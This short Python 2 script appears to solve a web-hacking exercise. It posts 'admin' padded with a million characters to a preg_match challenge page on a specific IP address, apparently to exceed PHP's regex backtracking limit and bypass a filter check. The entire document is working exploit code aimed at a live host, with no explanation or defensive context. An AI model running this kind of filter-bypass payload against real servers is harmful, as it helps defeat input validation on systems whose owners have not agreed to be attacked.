#-*- coding: utf-8 -*-
import requests
import sys
url = "http://203.229.206.22/~wing608/webstudy/att/05/preg_match/"
payload = "admin"
payload += "a"*100*100*100
data = {"str" : payload}

res = requests.post(url,data=data)

print res.text